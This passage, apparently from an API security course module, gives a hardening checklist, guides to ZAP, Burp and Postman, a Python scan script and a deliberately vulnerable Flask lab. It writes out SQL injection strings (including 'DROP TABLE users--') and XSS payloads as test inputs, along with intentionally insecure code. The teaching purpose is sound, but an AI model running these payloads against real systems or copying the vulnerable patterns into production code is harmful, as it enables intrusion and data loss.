- [ ] **Implement request size limits** - Prevent large payload attacks
- [ ] **Set appropriate timeouts** - Prevent resource exhaustion
- [ ] **Sanitize output** - Prevent XSS attacks
- [ ] **Use HTTPOnly and Secure flags on cookies** - Protect session tokens
- [ ] **Implement CSRF protection** - For state-changing operations
- [ ] **Validate file uploads** - Check type, size, and content
- [ ] **Use prepared statements** - For all database queries
- [ ] **Implement proper session management** - Expiration, regeneration, secure storage
- [ ] **Enable audit logging** - Track all security-relevant events
- [ ] **Implement account lockout** - After failed login attempts

## Security Testing Tools 🔍

### 1. OWASP ZAP (Zed Attack Proxy)

**What it is:** Free, open-source web application security scanner.

**Features:**
- Automated vulnerability scanning
- Manual testing tools
- Intercept and modify requests
- Find SQL injection, XSS, and more

**Basic Usage:**

```bash
# Install ZAP
# Download from https://www.zaproxy.org/download/

# Start ZAP proxy
# Configure your browser to use proxy: localhost:8080

# Run automated scan
zap.sh -cmd -quickurl http://localhost:5000 -quickout report.html
```

**Quick Start:**
1. Launch OWASP ZAP
2. Enter your API URL (e.g., `http://localhost:5000`)
3. Click "Attack" to start automated scan
4. Review alerts for vulnerabilities
5. Fix issues and rescan

**Common Alerts to Check:**
- SQL Injection
- Cross-Site Scripting (XSS)
- Path Traversal
- Missing Security Headers
- Insecure Communication

### 2. Burp Suite Community Edition

**What it is:** Web vulnerability scanner and proxy tool.

**Features:**
- Intercept and modify HTTP requests
- Automated vulnerability scanning (Pro version)
- Spider/crawler to map application
- Repeater for manual testing
- Intruder for fuzzing

**Basic Usage:**

1. Configure browser to use Burp proxy (localhost:8080)
2. Browse your API/website
3. View requests in "HTTP history"
4. Send requests to "Repeater" for manual testing
5. Modify requests and observe responses

**Testing SQL Injection with Burp:**

```
1. Intercept a request in Burp Proxy
2. Send to Repeater
3. Modify parameter: id=1' OR '1'='1
4. Send request
5. Analyze response for signs of SQL injection
```

### 3. Testing with Postman

**Security Tests in Postman:**

```javascript
// Test for security headers
pm.test("Has security headers", function () {
    pm.response.to.have.header("X-Content-Type-Options");
    pm.response.to.have.header("X-Frame-Options");
    pm.response.to.have.header("Strict-Transport-Security");
});

// Test rate limiting
pm.test("Rate limit headers present", function () {
    pm.response.to.have.header("X-RateLimit-Limit");
    pm.response.to.have.header("X-RateLimit-Remaining");
});

// Test authentication required
pm.test("Requires authentication", function () {
    // Send request without auth token
    pm.expect(pm.response.code).to.be.oneOf([401, 403]);
});

// Test SQL injection prevention
pm.test("SQL injection prevented", function () {
    // If response doesn't contain SQL errors, it's safe
    pm.expect(pm.response.text()).to.not.include("SQL");
    pm.expect(pm.response.text()).to.not.include("syntax error");
});

// Test XSS prevention
pm.test("XSS payload escaped", function () {
    const response = pm.response.json();
    // Verify script tags are escaped
    pm.expect(response.comment).to.not.include("<script>");
});

// Test for sensitive data exposure
pm.test("No sensitive data in response", function () {
    const response = pm.response.text();
    pm.expect(response).to.not.include("password");
    pm.expect(response).to.not.include("secret");
    pm.expect(response).to.not.include("api_key");
});
```

**Postman Collection for Security Testing:**

```json
{
  "info": {
    "name": "API Security Tests",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "item": [
    {
      "name": "Test SQL Injection",
      "request": {
        "method": "GET",
        "url": "{{base_url}}/api/users?id=1' OR '1'='1"
      }
    },
    {
      "name": "Test XSS",
      "request": {
        "method": "POST",
        "url": "{{base_url}}/api/comments",
        "body": {
          "mode": "raw",
          "raw": "{\"text\": \"<script>alert('XSS')</script>\"}"
        }
      }
    },
    {
      "name": "Test Rate Limiting",
      "request": {
        "method": "GET",
        "url": "{{base_url}}/api/data"
      }
    }
  ]
}
```

### 4. Common Vulnerabilities to Test For

**Checklist for Manual Testing:**

#### SQL Injection
- [ ] Try `' OR '1'='1` in input fields
- [ ] Try `'; DROP TABLE users--`
- [ ] Try `' UNION SELECT NULL--`
- [ ] Verify parameterized queries are used

#### XSS
- [ ] Try `<script>alert('XSS')</script>`
- [ ] Try `<img src=x onerror=alert('XSS')>`
- [ ] Try `<svg/onload=alert('XSS')>`
- [ ] Verify output is escaped

#### Authentication
- [ ] Try accessing protected endpoints without token
- [ ] Try using expired tokens
- [ ] Try using another user's token
- [ ] Verify proper 401/403 responses

#### Authorization
- [ ] Try accessing other users' data
- [ ] Try performing admin actions as regular user
- [ ] Verify role-based access control

#### Rate Limiting
- [ ] Send many requests quickly
- [ ] Verify 429 status code returned
- [ ] Check rate limit headers

#### CORS
- [ ] Check `Access-Control-Allow-Origin` header
- [ ] Verify only allowed origins accepted
- [ ] Try requests from unauthorized origin

#### Security Headers
- [ ] Verify `X-Content-Type-Options: nosniff`
- [ ] Verify `X-Frame-Options: DENY`
- [ ] Verify `Strict-Transport-Security` header
- [ ] Verify `Content-Security-Policy` header

**Automated Scan Script:**

```python
# security_scan.py
import requests

def security_scan(base_url):
    results = []
    
    # Test 1: SQL Injection
    print("Testing SQL Injection...")
    response = requests.get(f"{base_url}/api/users?id=1' OR '1'='1")
    if "SQL" in response.text or "syntax" in response.text:
        results.append("❌ SQL Injection vulnerability detected!")
    else:
        results.append("✓ SQL Injection test passed")
    
    # Test 2: XSS
    print("Testing XSS...")
    response = requests.post(
        f"{base_url}/api/comments",
        json={"text": "<script>alert('XSS')</script>"}
    )
    if "<script>" in response.text:
        results.append("❌ XSS vulnerability detected!")
    else:
        results.append("✓ XSS test passed")
    
    # Test 3: Security Headers
    print("Testing security headers...")
    response = requests.get(base_url)
    headers_to_check = [
        'X-Content-Type-Options',
        'X-Frame-Options',
        'Strict-Transport-Security'
    ]
    for header in headers_to_check:
        if header not in response.headers:
            results.append(f"❌ Missing header: {header}")
        else:
            results.append(f"✓ {header} present")
    
    # Test 4: Rate Limiting
    print("Testing rate limiting...")
    for i in range(20):
        response = requests.get(f"{base_url}/api/data")
    if response.status_code == 429:
        results.append("✓ Rate limiting working")
    else:
        results.append("❌ Rate limiting not detected")
    
    return results

if __name__ == '__main__':
    results = security_scan('http://localhost:5000')
    print("\n" + "="*50)
    print("SECURITY SCAN RESULTS")
    print("="*50)
    for result in results:
        print(result)
```

## Practical Security Lab 🧪

### Vulnerable API for Learning

This lab provides an intentionally vulnerable API for you to practice finding and fixing security issues.

**Setup:**

```bash
cd security-labs
python vulnerable_api.py
```

**Your Tasks:**

1. **Find Vulnerabilities:**
   - Identify SQL injection points
   - Find XSS vulnerabilities
   - Discover authentication bypasses
   - Test rate limiting
   - Check CORS configuration

2. **Exploit Them (Safely!):**
   - Extract sensitive data using SQL injection
   - Inject malicious scripts
   - Access unauthorized resources

3. **Fix the Issues:**
   - Implement parameterized queries
   - Add input validation
   - Escape output properly
   - Implement rate limiting
   - Configure CORS securely

4. **Test Your Fixes:**
   - Verify vulnerabilities are patched
   - Run automated security scans
   - Test edge cases

**Example Vulnerabilities to Find:**

```python
# Vulnerability 1: SQL Injection in login
@app.route('/login', methods=['POST'])
def login():
    username = request.json['username']
    password = request.json['password']
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    # Try: username = "admin' --"

# Vulnerability 2: XSS in comments
@app.route('/comments', methods=['POST'])
def add_comment():
    comment = request.json['comment']
    # Stores unsanitized comment
    save_comment(comment)
    # Try: comment = "<script>alert('XSS')</script>"

# Vulnerability 3: No authentication
@app.route('/admin/users')
def get_all_users():
    # No authentication check!
    return jsonify(get_users())

# Vulnerability 4: No rate limiting
@app.route('/api/expensive-operation')
def expensive():
    # No rate limiting - can be abused
    return perform_expensive_computation()
```

See [security-labs/README.md](../security-labs/README.md) for detailed lab instructions and the complete vulnerable application code.

## Security Best Practices Checklist ✅

### 1. Authentication & Authorization
- [ ] Use strong password hashing (bcrypt, argon2)
- [ ] Implement proper authentication (JWT, sessions)
- [ ] Verify user permissions before actions
- [ ] Use secure session management

### 2. Data Protection
- [ ] Always use HTTPS in production
- [ ] Encrypt sensitive data at rest
- [ ] Don't log sensitive information
- [ ] Use environment variables for secrets

### 3. Input Validation
- [ ] Validate all user input
- [ ] Use parameterized queries (prevent SQL injection)
- [ ] Sanitize output (prevent XSS)
- [ ] Set appropriate data type constraints

### 4. Rate Limiting & DoS Protection
- [ ] Implement rate limiting
- [ ] Set request size limits
- [ ] Use timeout for long operations

### 5. CORS Configuration
- [ ] Configure CORS properly
- [ ] Only allow trusted origins
- [ ] Don't use wildcard (*) in production

### 6. Error Handling
- [ ] Don't expose stack traces to users
- [ ] Log errors securely
- [ ] Return generic error messages to clients

### 7. Dependencies
- [ ] Keep dependencies updated
- [ ] Regularly scan for vulnerabilities
- [ ] Use minimal necessary dependencies

### 8. HTTP Headers
- [ ] Set security headers (CSP, X-Frame-Options, etc.)
- [ ] Remove server version headers
- [ ] Implement HSTS for HTTPS

## Security Headers Example

```python
from flask import Flask

app = Flask(__name__)

@app.after_request
def set_security_headers(response):
    # Prevent clickjacking
    response.headers['X-Frame-Options'] = 'DENY'
    
    # Prevent MIME sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    # Enable XSS protection
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    # Content Security Policy
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    
    # Force HTTPS
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    
    return response
```

## Summary and Key Takeaways

✅ **Never trust user input** - always validate and sanitize  
✅ **Use parameterized queries** to prevent SQL injection  
✅ **Escape output** to prevent XSS attacks  
✅ **Implement rate limiting** to prevent abuse  
✅ **Configure CORS properly** - don't allow all origins  
✅ **Use HTTPS** always in production  
✅ **Keep dependencies updated** and scan for vulnerabilities  
✅ **Set security headers** to protect against common attacks

## What's Next?

You've mastered API security basics! Continue to **WebSockets** to learn about real-time communication.

---

[← Back: Databases for APIs](../08-Databases-for-APIs/) | [Next: WebSockets →](../10-WebSockets/)

## Practice

Complete the exercises in [exercises.md](./exercises.md) to secure your APIs!
